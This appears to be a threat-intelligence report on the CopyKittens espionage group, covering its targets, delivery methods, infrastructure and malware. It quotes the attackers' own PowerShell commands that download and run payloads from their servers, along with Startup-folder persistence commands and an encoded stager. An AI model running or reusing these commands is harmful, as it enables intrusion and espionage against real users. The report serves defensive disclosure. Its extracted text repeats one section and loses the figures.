Introduction 
CopyKittens  is  a  cyberespionage  group  that  has  been  operating  since  at  least  2013.  In  November  2015, 
ClearSky  and  Minerva  Labs  published1 the  first  public  report  exposing  its  activity.  In  March 2017,  ClearSky 
published a second report2 exposing further incidents, some of which impacted the German Bundestag. In this 
report, Trend Micro and ClearSky expose a vast espionage apparatus spanning the entire time the group has 
been  active.  It  includes  recent  incidents  as  well  as  older  ones  that  have  not  been  publicly  reported;  new 
malware; exploitation, delivery and command and control infrastructure; and the group's modus operandi. 
We dubbed this activity Operation Wilted Tulip  

Targetting 
CopyKittens  is  an  active  cyber  espionage  actor  whose  primary  focus  appears  to  be  foreign  espionage  on 
strategic  targets.  Its  main  targets  are  in  countries  such  as  Israel,  Saudi  Arabia,  Turkey,  The  United  States, 
Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. 
Targeted  organizations  include  government  institutions  (such  as  Ministry  of  Foreign  Affairs),  academic 
institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large 
IT  companies.  Online  news  outlets  and  general  websites  were  breached  and  weaponized  as  a  vehicle  for 
watering hole attacks.  

For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign 
Affairs  in  the  Turkish  Republic  of  Northern  Cyprus,  trying  to  infect  multiple  targets  in  other  government 
organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign 
affairs was  used as decoy.  In other cases,  Israeli embassies were  targeted, as well as foreign embassies in 
Israel. 

Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious 
attachments.  Fake  Facebook  profiles  have  been  used  for  spreading  malicious  links  and  building  trust  with 
targets. Some of the profiles have been active for years. 

Malware 
CopyKittens use several self-developed malware and hacking tools that have not been publicly reported to 
date, and are analyzed in this report: TDTESS backdoor; Vminst, a lateral movement tool; NetSrv, a Cobalt 
Strike  loader;  and  ZPP,  a  files  compression  console  program.  The  group  also  uses  Matryoshka  v1,  a  self-
developed RAT analyzed by ClearSky in the 2015 report, and Matryoshka v2 which is a new version, albeit with 
similar functionality. 

The group often uses the trial version of Cobalt Strike3, a publicly available commercial software for "Adversary 
Simulations and Red Team Operations." Other public tools used by the group are Metasploit, a well-known 
free and open source framework for developing and executing exploit code against a remote target machine; 
Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, "a PowerShell and Python 
post-exploitation agent." For detection and exploitation of internet-facing web servers, CopyKittens use Havij, 
Acunetix and sqlmap.   

A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and 
for data exfiltration. This feature is available both in Cobalt Strike and in Matryoshka. 

Most of the infrastructure used by the group is in the U.S., Russia, and The Netherlands. Some of it has been 
in use for more than two years.

Targeting 
Based  on  Trend  Micro  Telemetry,  incident  response  engagements,  and  open  source  threat  intelligence 
investigations,  we  have  learned  of  CopyKittens  target  organizations  and  countries.  Its  main  targets  are  in 
countries  such  as  Israel,  Saudi  Arabia,  Turkey,  The  United  States,  Jordan,  and  Germany.  Occasionally 
individuals in other countries are targeted as well as UN employees. 

Targeted  organizations  include  government  institutions  (such  as  Ministry  of  Foreign  Affairs),  academic 
institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large 
IT  companies.  Online  news  outlets  and  general  websites  were  breached  and  weaponized  as  a  vehicle  for 
watering hole attacks. 

For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign 
Affairs  in  the  Turkish  Republic  of  Northern  Cyprus,  trying  to  infect  multiple  targets  in  other  government 
organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign 
affairs was  used as decoy.  In other cases,  Israeli embassies were targeted, as well as foreign embassies in 
Israel. 

Based on the size of the attack infrastructure and length of the campaign, we estimate that there have been 
at least a few hundred people infected in multiple organizations in the targeted countries. 

After infecting a computer within a target organization, the  attacker would move latterly using one of the 
malware descried in chapter "Malware." It seems that their objective is to gather as much information and 
data from target organizations as possible. They would indiscriminately exfiltrate large amounts of documents, 
spreadsheets, file containing personal data, configuration files and databases.  

In at least one case, the attackers breached an IT company, and used VPN access it had to client organizations 
to breach their networks.  

Often, victim organizations would learn of the breach due to the non-stealthy behavior of the attackers. The 
attackers would "get greedy," infecting multiple computers within the network of breached organizations. This 
would raise an alarm in various defense systems, making the victims initiate incident response operations.

Delivery and Infection  

CopyKittens attack their targets using the following methods: 

•  Watering hole attacks – inserting malicious JavaScript code into breached strategic websites. 

•  Web  based  exploitation  –  emailing  links  to  websites  built  by  the  attackers  and  containing  known 

exploits. 

•  Malicious documents – email attachments containing weaponized Microsoft Office documents.  

•  Fake social media entities – fake personal and organizational Facebook pages are used for interaction 

with targets and for information gathering. 

•  Web hacking – Havij, Acuntix and sqlmap are used to detect and exploit internet-facing web servers.   

These methods are elaborated below. 

Watering Hole Attacks 

On 30 March 2017, ClearSky reported a breach of multiple websites, such as Jerusalem Post, Maariv news and 
the IDF Disabled Veterans Organization website.4 JavaScript code was inserted into the breached websites, 
loading BeEF (Browser Exploitation Framework) from domains owned by the attackers .5 For example: 

The malicious code was loaded from one of the following addresses: 

Malicious code added to Maariv website 

https://js.jguery[.]net/jquery.min.js 
 https://js.jguery[.]online/jgueryui.min.js 

This would enable the attackers to perform actions such as browser fingerprinting and information gathering, 
social engineering  attacks (like  asking  for credentials,  redirect to another page, asking  the user to install  a 
malicious extension or malware), network reconnaissance, infecting the computer using Metasploit exploits, 
and more.6 The malicious code was served only when specific targets visited the website, likely based on IP 
whitelisting. 

Notably, prior to that publication, the German Federal Office for Information Security (BSI) said in a statement 
that it had investigated "problems in network traffic" of the German Bundestag.7 The statement concluded 
that the website of Israeli newspaper Jerusalem Post was manipulated and linked to a harmful third party in 
January 2017.

Web-Based Exploitation  

In two incidents, the attackers breached the mailbox of a person related to a target organization. From this 
(real) account, they replied to previous correspondences with these organizations, adding a malicious link to 
a website registered and built by attackers: primeminister-goverment-techcenter].[tech. 8 

JavaScript  code,  at  least  parts  of  which  were  copied  from  public  sources,  fingerprinted  the  visitor's  web 
browser.9 This was likely used for later browser exploitation with known vulnerabilities.  

In some pages the code enumerates and collects a list of installed browser plugins, in others it tries to detect 
the real IP of the computer:

The data is sent to the attackers, and the victim is redirected to https://akamitechnology[.]com/.

JavaScript and Java code loaded into webpage, victim is redirected after 20 seconds 

Malicious Documents 

The  attackers  use  three  document  based  exploitation  types:  exploiting  CVE-2017-0199,  embedding  OLE 
objects, and macros. If the victim opens a document and the exploitation is successful (in the latter two, user 
interaction  might  be  required),  the  attackers  would  receive  access  to  the  computer  via  self-developed  or 
publicly available malware (see "Malware" chapter for more details).  

Exploiting CVE-2017-0199 

On 26 April 2017, a malicious email was sent from an employee account that was likely breached within the 
Ministry of  Northern Cyprus. It was sent to a disclosed recipients list  in government  institutions  in several 
countries  and  other  organizations,  mostly  in  or  related  to  ministries  of  foreign  affairs.  We  should  note, 
however, that it is possible that the attackers were interested only in a few of the recipient organizations, but 
sent it to a wider list because they showed up in previous correspondences in the breached account. 

Recipients were in the following domains: 

mofa.gov.vn 
mfa.gov.sg 
mfa.gov.tr 
post.mfa.uz 
mfa.am 
mfa.gov.by

Cyprus 

Attached to it was a document named "IRAN_NORTH-KOREA_Russia 20170420.docx".11 

The document exploited CVE-2017-0199, downloading an rtf file from:

In another case, the following document was uploaded to VirusTotal from Israel:12  

"The North Korean weapons program now testing USA range.docx" 

Content of the malicious document and a prompt that opens when external links are updated 

It downloads an rtf document from:

The sample communicates with gsvr-static[.]co via DNS. 

Yet in another case, malicious documents named “omnews.doc” and “pictures.doc” were served from the 
following locations:

Embedded OLE Objects  

In February 2017 a document titled "ssl.docx" was delivered to targets, likely via email.14 It asked the recipient 
to "Please Update Your VPN Client from This Manual" [sic]. 

Content of the malicious document asking the victim to update the VPN Client 

The "VPN Client manual" was an embedded OLE binary object, an executable with a reverse file extension: 
checkpointsslvpn?fdp.exe. 15 (The  "?"  stands for an invisible Unicode character that  flips the direction of  the 
string, making it look like a PDF file "exe.pdf.")16 It was composed of two files: a self-extracting executable and 
a PDF. 

They run via the following command: 

Bundled executable and PDF files 

cmd.exe /c copy zWEC.tmp %userprofile%\desktop\Maariv_Tops.pdf&&copy Ma_1.tmp 
"%userprofile%\AppData\Roaming\Microsoft\Windows\Start 
Menu\Programs\Startup"\sourcefire.pif&&cd %userprofile%\desktop&&Maariv_Tops.pdf 

The PDF file is a decoy displayed to the victim during infection. It contains content copied on March 2017 from 
the public website of Maariv, a major Israeli news outlet.

16 Copykittens have used this this method before, for example in a document named "mfaformann?fdp.exe"

Content of the malicious PDF file, copied from Maariv website 

The self-extracting executable contains another executable, named p.exe, which was digitally signed with a 
stolen certificate of a legitimate company called AI Squared.  

Interestingly,  this  digital  certificate  was  used  by  a  threat  group  called  Oilrig.17 This  might  indicate  the  two 
groups share resources or otherwise collaborate in their activity.

The self-extracting executable serves as a downloader, running the following command: 

cmd.exe /c powershell.exe -nop -w hidden -c "((new-object 
net.webclient).downloadstring('http://jpsrv-java-jdkec2.javaupdate[.]co:80/JPOST'))" 

The C&C server sends back a short PowerShell code that loads a Cobalt Strike stager into memory.

Both the docx and the executable contained the name shiranz in their metadata or file paths:

C:\Users\shiranz\Desktop\checkpointsslvpn?fdp.exe 
C:\Users\shiranz\AppData\Local\Temp\checkpointsslvpn?fdp.exe

In another sample, the decoy document was in Turkish, indicating the target's nationality.18 This document 
was likely stolen from the Turkish Ministry of Foreign Affairs: test_fdp.exe.19 

While the decoy PDF document is opened, the following commands are executed: 

Decoy document in Turkish  

cmd.exe /c copy Ma_1.tmp "%userprofile%\AppData\Roaming\Microsoft\Windows\Start 
Menu\Programs\Startup"\CheckpointGO.pif&& copy sslvpn.tmp

cmd.exe /c powershell.exe -nop -w hidden -c "IEX ((new-object 
net.webclient).downloadstring('http://jpsrv-java-jdkec2.javaupdate[.]co:80/Sourcefire'))"

Malicious Macros 

In October 2016, the attackers uploaded to VirusTotal multiple files containing macros, likely to learn if they 
are detected by antivirus engines.  

For example, "Date.dotm" contains this default Word template content:20 

A default template of a Word document used as decoy 

The macro runs a Cobalt Strike stager that communicates with wk-in-f104.1c100.n.microsoft-security[.]host . 

The attackers also uploaded an executable files that would run a Word document with content in Hebrew.21 

The word document contains a macro that runs the following command: 

Hebrew decoy document  

cmd.exe  /c  powershell  -ExecutionPolicy  bypass  -noprofile  -windowstyle  hidden  (New-Object 
System.Net.WebClient).DownloadFile('http://pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube. 
online/winini.exe','%TEMP%\XU.exe');&start %TEMP%\XU.exe& exit 

In parallel, the executable drops d5tjo.exe, which is the legitimate Madshi debugging tool 2223

Fake Social Media Entities 

Back in 2013, CopyKittens used several Facebook profiles to spread links to a website impersonating Haaretz 
news, an Israeli  newspaper. In the screenshot  below you can see  the  fake profile  linking to haarettz.co[.]il 
(note the extra t in the domain). 

"Erick Brown"24 

"Amanda Morgan"25

While "Erik Brown" has not been publicly active since September 2015, and the two other Israeli profiles have 
not been publicly active since September 2013, Amanda Morgan is still active to date. She has thousands of 
friends and 2,630 followers, many of which are Israeli. In 2015 she sent her friends an invitation to Like a 
Facebook page: "Emet press." 

Amanda Morgan invites its friends to like "Emet press"  

Emet press (Emet means "truth" in Hebrew), is described as a non-biased news aggregator operated by Israeli 
students aboard. However, the Hebrew text is clearly not written by someone who speaks Hebrew as a first 
language:

The  page  re-posted  news  stories  in  Hebrew  copied  from  online  news  outlets  until  August  2016. 28  An 
accompanying website with similar content was published in www.emetpress[.]com. 

Emet press website 

Neither  the  Facebook  page  nor  website  have  been  used  to  spread  malicious  or  fake  content  publicly.  We 
estimate that they were used to build trust with targets,  and potentially send malicious content in private 
messages, however we do not have evidence of such activity. 

Looking at the website source code reveals that it was built with NovinWebGostar, a website building platform.

Web Hacking 

Based on logs from internet-facing web servers in target organizations, we have detected that CopyKittens use 
the following tools for web vulnerability scanning and SQL Injection exploitation. 

Havij: "An automatic SQL Injection tool, [which is] distributed by ITSecTeam, an Iranian security company."29 
Havij is freely distributed and has a graphical user interface. It is commonly used for automated SQL Injection 
and vulnerability assessments. 

sqlmap: An "automatic SQL Injection and database takeover tool."30 sqlmap is an open source penetration 
testing  tool  that  automates  the  process  of  detecting  and  exploiting  SQL  Injection  flaws  and  taking  over 
database servers. It is capable of database fingerprinting, data fetching from the database, and accessing the 
underlying file system and executing commands on the operating system via out-of-band connections. 

Acunetix: A commercial vulnerability scanner. "Acunetix tests for SQL Injection, XSS, XXE, SSRF, Host Header 
Injection and over 3000 other web vulnerabilities."31

▪  Major internet and software companies and services – Microsoft, Google, Akamai, Cloudflare, 

Amazon, Oracle, Facebook, Cisco, Twitter, Intel 

▪  Security companies and products – Trend Micro, McAfee, Microsoft Defender, and potentially 

▪

Israeli organizations of interest to the victim – News originations, Israeli Prime Minister Office, 
an Israeli ISP 

▪  Other organizations or generic web services 

•  The attackers always use Whoisguard for Whois details protection.33 
•  Domains are usually registered in bulk every few months. 
• 

Long subdomains are created like those used by Content Delivery Networks. For example: 

wk-in-f104.1e100.n.microsoft-security[.]host 
ns1.static.dyn-usr.gsrv01.ssl-gstatic[.]online

Often the attackers would point malicious domains to IPs not in their control. For example, as can be seen in 
the screenshot below from PassiveTotal, multiple domains and hosts (marked red) were pointed to a non-
malicious IP owned by Google.3435  

Multiple domains and hosts pointing to a non-malicious IP owned by Google 

This pattern was instrumental for us in pivoting and detecting further malicious domains.

Recently the attackers implemented self-signed certificates in some of the severs they manage, impersonating 
Microsoft and Google.37

Malware 

In this chapter we analyze and review malware used by CopyKittens. 

TDTESS Backdoor 

TDTESS  (22fd59c534b9b8f5cd69e967cc51de098627b582)  is  64-bit  .NET  binary  backdoor  that  provides  a 
reverse shell with an option to download and execute files. It routinely calls in to the command and control 
server  for  new  instructions  using  basic  authentication.  Commands  are  sent  via  a  web  page.  The  malware 
creates a stealth service, which will not show on the service manager or other tools that enumerate services 
from WINAPI or Windows Management Instrumentation.  

Installation and removal 

TDTESS  can  run  as  either  an  interactive  or  non-interactive  (service)  program.  When  called  interactively,  it 
receives one of the two arguments: installtheservice to install itself or uninstalltheservice to remove itself. The 
arguments are described below: 

installtheservice  

If running with administrator privileges, it will install a service with the following characteristics: 

Key name: bmwappushservice 
Display name: bmwappushsvc 
Description: WAP Push Message Routing Service 
Type: own (runs in its own process) 
Start  type:  auto  (starts  each  time  the  computer  is  restarted  and  runs  even  if  no  one  logs  on  to  the 
computer) 
Path: <main executable path> (In our analysis: c:\Users\PC008\Desktop\t.exe) 
Security descriptor: 
D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLC
SWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F
A;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) 

Service information from command-line using sc tool 

The hardcoded security descriptor used to create the service is a persistence technique. Interactive users, even 
if they are administrators, cannot stop or even see the service in services.msc snap-in.

Following is a list of denied commands: 

service_change_config 
service_query_status 
service_stop 
service_pause_continue 
delete 

Two  log  files  are  created  during  the  service  installation,  but  deleted  by  the  program.  Following  is  their 
recovered content: 

Service information in Registry 

InstallUtil.InstallLog 

After creating the service, it will update the file creation time to that of the following file: 

%windir%\system32\svchost.exe 

<filename>.t.InstallLog 

Page 28 of 48 
©All rights reserved to ClearSky cyber security and Trend Micro, 2017 

uninstalltheservice 

If running with administrator privileges, it will uninstall the said service, create log files and then deletes them. 

InstallUtil.InstallLog 

<filename>.t.InstallLog 

Because the  service installing mechanism appears to be  default for .NET  programs,  the creator of the tool 
deletes the log files right after they are created. 

If no argument is given when called interactively, the program terminates itself. 

Functionality 

The  service  is  started  immediately  after  installation.  After  five  minutes,  it  verifies  internet  connectivity  by 
making a HTTP HEAD request to microsoft.com. 

Then it tries to access the C&C servers looking for commands. 

Hardcoded HTTP parameters and URL

As a reply, TDTESS expects one of the following Bas64 encoded commands: 

getnrun - download and execute a file. Parameters are drop, drop_path and t. 
runnreport - send information about the computer. Parameters are cmd and boss. 
wait - time to next interval to get data.

Vminst for Lateral Movement 

Vminst (a60a32f21ac1a2ec33135a650aa8dc71) is a lateral movement tool used to infect hosts in the network 
using previously stolen credentials. It Injects Cobalt Strike into memory of infected hosts.  

The  binary  implements  ServiceMain  and  is  intended  to  be  installed  as  a  service  named  “sdrsrv.”  When  it 
functions as a service, it injects Cobalt Strike beacon into its own process (which is 32-bit “svchost”) or creates 
a new 32-bit “rundll32” process and injects the beacon into the new process. The injection method depends 
on the parameter received when the service was created. 

It is configured to open a new “rundll32” process in suspend-mode and create a remote thread which executes 
a Cobalt Strike beacon or shellcode. 

The binary has the option to run and load itself in memory. It also has the option to be executed through its 
exported function "v," which gets a base64 string parameter built as follows: 

Base-64-Encode(“/mv /OptionalCommand”) 

OptionalCommand can be one of the following: 

•  help - prints usage instructions: 

[*] /help V160\n 
Get : Create Service and run beacon over self thread\n 
[*] /get ip (use current token)\n 
[*] /get ip domain user pass\n 
[*] /get ip user pass\n 
New : Create Service and run beacon over new rundll32.exe thread\n 
[*] /new ip (use current token)\n 
[*] /new ip domain user pass\n 
[*] /new ip user pass\n 
[*] /new ip user pass\n 
Del : Delete service and related dlls from remote host 
[*] /del ip domain user pass\n 
[*] /del ip user pass\n 
[*] /del ip\n 
Run : Run a new beacon !\n 
[*] /run [no arguments] 

•  del - stops and deletes the service “sdrsrv,” and deletes the following files: 

\\ [IP or computer name (Can be Localhost)]\C$\Users\public\vminst.tmp 
\\ [IP or computer name (Can be Localhost)]\C$\Windows\Temp\vminst.tmp 
\\ [IP or computer name (Can be Localhost)]\C$\Windows\vminst.tmp 

• 

• 

• 

scan - sends “]ok[” to the parent of its parent process. 

info - sends “]ok[” to the parent of its parent process. 

run - injects a beacon into a new “rundll32” process. 

•  get - gets an IP address, installs and starts the “sdrsrv” service in the remote hosts. 

•  new - gets IP address, deletes the old vminst from install path, and installs the “sdrsrv” service in the 
remote  hosts.  Then,  starts  the  service  with  parameter  “NEW_THREAD”  that  runs  the  service.  This 
command is likely used for updating the implant. 

The attacker uses vminst.tmp to spread across the organization. Using the command “rundll32 vminst.tmp,v 
/mv /get ip-segment credentials” it enumerates the segments and tries to connect to the hosts through SMB 
(“GetFileAttributes” to network path), installing the “sdrsrv” service in each host it can access.

NetSrv – Cobalt Strike Loader 

NetSrv  (efca6664ad6d29d2df5aaecf99024892)  loads  Cobalt  Strike  beacons  and  shellcodes  in  infected 
computers. 

The binary implements ServiceMain, intended to be installed as a service named “netsrv.” When it functions 
as a service, it is configured to open a new “rundll32” process in suspend-mode and create a remote thread 
that executes a Cobalt Strike beacon or shellcode. 

The binary also has the option to be executed with parameters that determine what it will inject into the 
“rundll32” process. The command-line is as follows: 

netsrv.exe /managed /ModuleToInject 

The ModuleToInject can be one of these options: 

sbdns 
slbdnsk1 
slbdnsn1 
slbsbmn1 
slbsmbk1 

Each of these options injects a Cobalt Strike beacon or shellcode into the “rundll32” process.

Matryoshka v1 – RAT 

Matryoshka v1 is a RAT analyzed in the 2015 report by ClearSky and Minerva.38 It uses DNS for command and 
control  communication,  and  has  common  RAT  capabilities  such  as  stealing  Outlook  passwords,  screen 
grabbing, keylogging, collecting and uploading files, and giving the attacker Meterpreter shell access. We have 
seen this version of Matreyoshka in the wild from July 2016 until January 2017. 

 The Matryoshka.Reflective_Loader injects the module Matryoshka.Rat, which has the same persistence keys 
and communication method described in the original report.

Matreyoshka v2 – RAT 

Matryoshka v2  (bd38cab32b3b8b64e5d5d3df36f7c55a)  is  mostly  like  Matreyoshka  v1  but  has  fewer 
commands  and  a  few  other  minor  changes.  Upon  starting  it  will  inject  the  communication  module 
to all available processes (with the same run architecture and the same or lower level of permission).  

The inner name of Svchost’s is Injector.dll. The next stage, in memory, is ReflectiveDLL.dll. The ReflectiveDLL.dll 
provides persistence via a schedule task and checks that the stager, Injector.dll, exist on disk.

ZPP – File Compressor  

ZPP  (bcae706c00e07936fc41ac47d671fc40)  is  a  .NET  console  program  that  compresses  files  with  the  ZIP 
algorithm. It can transfer compressed files to a remote network share. 

Command line options are as follows: 

-I - File extension to compress (i.e.: .txt) 
-s - Source directory 
-d - Destination directory 
-gt - Greater than creation timestamp 
-lt  - Lower than creation timestamp 
-mb  - Unimplemented 
-o  - Output file name 
-e - File extension to skip (except) 

ZPP  

ZPP will recursively read all files in the source directory to compress them with the maximum compression 
rate if their names match the extension pattern given (-i). The compressed ZIP file is written to the output 
directory (-d). If no output file name is set, ZPP will use the mask zpp<random_number>.out. <file_number>.  

For example: 

The file compilation timestamp is Tue, 05 Jul 2016 17:22:59 UTC. 

Filename is zpp5077.out0  

ad09feb76709b825569d9c263dfdaaac is a previous version (compilation timestamp: Sat, 09 Jan 2016 17:02:38 
UTC) and is only different in that it accepts the –e switch, which ignored by the program logic. 

214be584ff88fb9c44676c1d3afd7c95  is  the  newest  version  (compilation  timestamp:  Mon,  26  Sep  2016 
19:49:34 UTC). It is supposed to implement the –s switch but although it is set when the user gives it to the 
program, the switch is ignored by the code. 

ZPP seems to be under development. All versions have bugs. 

ZPP version 2.0 

It  uses  the  reduced  version  of  DotNetZip 
(7c359500407dd393a276010ab778d5af) to be under the same directory or %PATH%.

Cobalt Strike 

Cobalt  Strike  is  a  publicly  available  commercial  software  for  "Adversary  Simulations  and  Red  Team 
Operations."40 While not malicious in and of itself, it is often used by cybercrime groups and state-sponsored 
threat groups, due to its post-exploitation and covert communication capabilities. 41 4243 44 

CopyKittens use the free 21-day trial version of Cobalt Strike. Thus, malicious communication generated by 
the tool is much easier to detect, because a special header is sent in each HTTP GET transaction. The special 
header is "X-Malware," i.e. there is a literal indication that "this network communication is malicious." All that

defender  need  to  do  to  detect  infections  is  to  look  for  this  header  in  network  traffic.  Other  "tells"  are 
implemented in the trail version.45 

CopyKittens often use Cobalt Strike's DNS based command and control capability.46 Other capabilities include 
PowerShell scripts execution, keystrokes logging, taking screenshots, file downloads, spawning other payloads, 
and peer-to-peer communication over the SMB. 

Persistency 

The attackers used a novel way for persistency of Cobalt Strike samples in certain machine – a scheduled task 
was written directly to the registry.  

The malware  creates  a  PowerShell  wrapper,  which executes  powershell.exe  to run  scripts.  The  wrapper  is 
copied to %windir% with one of the following names: 

svchost.exe 
csrss.exe 
notpad.exe (note missing e) 
conhost.exe 

The scheduled tasks are saved in the following registry path: 

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks 

With the following attributes: 

"Path"="\\Microsoft\\Windows\\Media Center\\ConfigureLocalTimeService" 
"Description"="Media Center Time Update From Computer Local Time." 
"Actions"=hex:01,00,66,66,00,00,00,00,2c,00,00,00,43,00,3a,00,5c,00,57,00,69,\ 
00,6e,00,64,00,6f,00,77,00,73,00,5c,00,73,00,76,00,63,00,68,00,6f,00,73,00,\ 
74,00,2e,00,65,00,78,00,65,00,7e,31,00,00,2d,00,6e,00,6f,00,70,00,20,00,2d,\ 
00,77,00,20,00,68,00,69,00,64,00,64,00,65,00,6e,00,20,00,2d,00,65,00,6e,00,\

00,4a,00,41,00,42,00,7a,00,41,00,44,00,30,00,41,00,54,00,67,00,42,00,6c,00,\ 
[…] 

The hex code in the Actions attribute is converted into the following command line action: 

C:\Windows\svchost.exe -nop -w hidden -encodedcommand JABzAD0ATgBl[…] 

The executed command is a base64 encoded PowerShell cobalt strike stager. 

The  task  does  not  have  a  name  attribute  and  it  does  not  appear  in  windows  scheduled  task  viewers.  The 
installation methods of this persistency method is unknown to us. 

Metasploit 

A well-known free and open source framework for developing and executing exploit code against a remote 
target machine.47 It has more than 1,610 exploits, as well as more than 438 payloads, which include command 
shell that enables users to run collection scripts or arbitrary commands against the host. Meterpreter, which 
enables users to control the screen of a device using VNC and to browse, upload and download files. It also 
employs dynamic payloads that enables users to evade antivirus defenses by generating unique payloads.48

Empire Post-exploitation Framework 

In several occasions  the  attackers used  Empire, a free  and open source  "post-exploitation framework that 
includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent.49 The framework 
offers  cryptologically-secure  communications  and  a  flexible  architecture.  On  the  PowerShell  side,  Empire 
implements the  ability to run PowerShell agents  without  needing powershell.exe, rapidly  deployable post-
exploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network 
detection, all wrapped up in a usability-focused framework."
